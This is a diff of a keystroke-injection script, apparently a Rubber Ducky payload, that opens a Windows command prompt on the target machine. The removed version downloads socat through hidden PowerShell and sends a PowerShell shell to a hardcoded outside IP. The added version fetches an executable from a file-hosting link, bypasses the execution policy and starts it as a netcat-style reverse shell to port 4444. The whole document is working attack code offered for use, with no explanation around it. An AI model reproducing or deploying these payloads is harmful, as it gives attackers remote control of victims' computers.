@@ -1,16 +1,14 @@
-DELAY 1000
-
+DELAY 400 
 GUI r
-DELAY 500
+DELAY 100
+
 STRING cmd
-SHIFT CTRL ENTER
-DELAY 1000
-LEFT
 ENTER
-DELAY 1000
+DELAY 100
 
-REM Replace URL_TO_SOCAT_ZIP and LISTENING_IP
-STRING powershell -WindowStyle Hidden -ExecutionPolicy Unrestricted -Command "cd /; mkdir win; cd win; wget URL_TO_SOCAT_ZIP -O socat.zip; Expand-Archive -LiteralPath socat.zip -DestinationPath .; /win/socat-1.7.3.0-windows-master/socat.exe TCP4:77.101.245.118:53 EXEC:'powershell.exe',pipes"
+STRING cd / & mkdir /win & cd /win & echo (wget 'https://1fichier.com/?vcwr373r3a4sstxgguzr' -OutFile.a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1
 ENTER
+DELAY 50
 
-DELAY 10000
+STRING START /MIN a.exe 192.168.68.1 4444 -e cmd.exe -d & exit
+ENTER
